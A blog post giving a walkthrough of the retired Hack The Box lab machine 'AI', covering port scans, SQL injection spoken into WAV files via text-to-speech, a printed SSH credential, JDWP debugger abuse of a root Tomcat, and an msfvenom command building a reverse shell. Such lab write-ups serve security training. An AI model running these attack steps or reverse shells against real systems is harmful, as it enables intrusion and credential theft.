---
layout: post
title: "AI: Hack The Box Walkthrough"
date: 2020-01-25 16:23:54 +0000
last_modified_at: 2020-01-25 16:23:54 +0000
category: Walkthrough
tags: ["Hack The Box", AI, retired, Linux]
comments: true
image:
  feature: ai-htb-walkthrough.jpg
  credit: geralt / Pixabay
  creditlink: https://pixabay.com/illustrations/web-network-programming-3706562/
---

This post documents the complete walkthrough of AI, a retired vulnerable [VM][1] created by [MrR3boot][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

AI is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.163 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-11-11 09:26:26 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.163                                    
Discovered open port 80/tcp on 10.10.10.163
```

Nothing unusual. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.163
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
```

Looks like `http` service is the only way to gain a foothold. This is what the site looks like.


{% include image.html image_alt="53d3f69c.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/53d3f69c.png" %}


### Directory/File Enumeration

Let's see what we can glean from `gobuster` and SecLists.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40 -x php,html,log,txt,sql,wav -s '200,301,302' -e -u http://10.10.10.163/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.163/
[+] Threads:        40
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,log,txt,sql,wav
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2019/11/11 09:43:58 Starting gobuster
===============================================================
http://10.10.10.163/about.php (Status: 200)
http://10.10.10.163/contact.php (Status: 200)
http://10.10.10.163/db.php (Status: 200)
http://10.10.10.163/images (Status: 301)
http://10.10.10.163/index.php (Status: 200)
http://10.10.10.163/index.php (Status: 200)
http://10.10.10.163/intelligence.php (Status: 200)
http://10.10.10.163/uploads (Status: 301)
===============================================================
2019/11/11 09:46:26 Finished
===============================================================
```

In addition to the presence of `ai.php`, there are `db.php` and `intelligence.php`. What's really interesting is the page `intelligence.php`. It seems to be suggesting that the input we should give is to be encoded as a WAV file.


{% include image.html image_alt="79066f86.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/79066f86.png" %}


### Microsoft Speech API / Windows Speech Recognition

If you look closely at the bottom of `intelligence.php`, it says "**We mostly use similar approach as Microsoft does.**", which suggests Microsoft Speech API and Windows Speech Recognition. Pivoting on this insight, I came to this piece of Windows Speech Recognition [documentation](https://support.microsoft.com/en-us/help/12427/windows-speech-recognition-commands#1TC=windows-vista) suggesting how to voice certain special characters that are not on `intelligence.php`.


{% include image.html image_alt="2821340c.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/2821340c.png" %}


Now, onto the other side of the equation...Text-to-Speech (or TTS). For that, I'm using SAPI5 TTSAPP from [eSpeak](http://espeak.sourceforge.net/).


{% include image.html image_alt="b6a02332.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/b6a02332.png" %}


This neat little application allows me to save the voice commands directly as WAV files. Perfect.

### Not your normal SQL Injection

Armed with the ability to generate voice commands as WAV files, I build a library of WAV primitives, which allows me to concatenate together a SQL injection string using `sox`.


{% include image.html image_alt="8ffac3ef.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/8ffac3ef.png" %}


Here's a demostration how it works.

#### Database Discovery - MySQL


{% include image.html image_alt="482acc34.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/482acc34.png" %}


#### UNION-based SQL Injection

```
# sox single_quote.wav space.wav union.wav space.wav select.wav space.wav version.wav open_paren.wav close_paren.wav space.wav sql_comment.wav sqli.wav
```


{% include image.html image_alt="a4e12b59.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/a4e12b59.png" %}


#### Information Leakage - Credentials

Now for the big one. By the way, I have to guess the table name, which is the only down side of this otherwise excellent box.

```
# sox single_quote.wav space.wav union.wav space.wav select.wav space.wav username.wav from.wav users.wav space.wav sql_comment.wav sqli.wav
```


{% include image.html image_alt="31a94bfd.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/31a94bfd.png" %}


And now for the password.


{% include image.html image_alt="b45b010a.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/b45b010a.png" %}


Voila. The credentials are (`alexa:H,Sq9t6}a<)?q93_`).

### Low-Privilege Shell

SSH is the only way in at this point.


{% include image.html image_alt="884bbd64.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/884bbd64.png" %}


There you go. The file `user.txt` is `alexa`'s home directory.


{% include image.html image_alt="15318160.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/15318160.png" %}


## Privilege Escalation

During enumeration of `alexa`'s account, I notice that Apache Tomcat is running as `root`. That's almost assuredly the tell-tale sign of privilege escalation. Here's why.


{% include image.html image_alt="1dbf6a27.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/1dbf6a27.png" %}


Let's see what other ports are listening. This step is important and it'll become evident later.


{% include image.html image_alt="db2fbab6.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/db2fbab6.png" %}


### Java Debug Wire Protocol (JDWP)

Java Debug Wire Protocol (JDWP) is listening at `8000/tcp`. That means we can attach a debugger to Tomcat via `8000/tcp`, yo!

There's no `jdb` on the box. Fret not, we can perform a local port forwarding when we connect to the box via SSH like so.

```
# ssh -L 8000:127.0.0.1:8000 -L 8005:127.0.0.1:8005 -L  8009:127.0.0.1:8009 -L 8080:127.0.0.1:8080 alexa@10.10.10.163
```

Once that's done, we can connect to the debugee (Tomcat) with our `jdb`.


{% include image.html image_alt="e7a47cb5.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/e7a47cb5.png" %}


Mind you, the Tomcat instance is killed and launched every two minutes, so the window of opportunity is pretty short.

#### Listing all threads


{% include image.html image_alt="cf8eb7cc.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/cf8eb7cc.png" %}


We are interested in `main` because that's where all the action originates.

#### Suspend all threads / Enter a thread / View the stack


{% include image.html image_alt="cd41bef1.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/cd41bef1.png" %}


Let's place a breakpoint in `java.net.ServerSock.accept`. According to the [documentation](https://docs.oracle.com/javase/7/docs/api/java/net/ServerSocket.html#accept()), ***it listens for a connection to be made and accepts. It blocks until a connection is made***. Recall the step where we list the listening ports? Because we don't know which port `ServerSocket` is bound to, we may need to try ports `8005/tcp` or `8009/tcp` to trigger the breakpoint.

#### Insert breakpoint / Trigger breakpoint

The `ServerSocket` object was bound to `8005/tcp`.


{% include image.html image_alt="c12b8778.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/c12b8778.png" %}


Awesome!

### Getting `root` shell

Let's get that `root` shell! We can use `msfvenom` to generate a reverse shell like so.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=1234 -f elf -o rev
```

I'll leave it as an exercise how that to transfer the file over to the box.


{% include image.html image_alt="d7c1ce33.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/d7c1ce33.png" %}


Over at my `nc` listener, a reverse shell appears...


{% include image.html image_alt="185031b3.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/185031b3.png" %}


With that, getting `root.txt` is trivial.


{% include image.html image_alt="42781b75.png" image_src="/37f3475d-8422-41b9-871e-6466dd67de6e/42781b75.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/216
[2]: https://www.hackthebox.eu/home/users/profile/13531
[3]: https://www.hackthebox.eu/
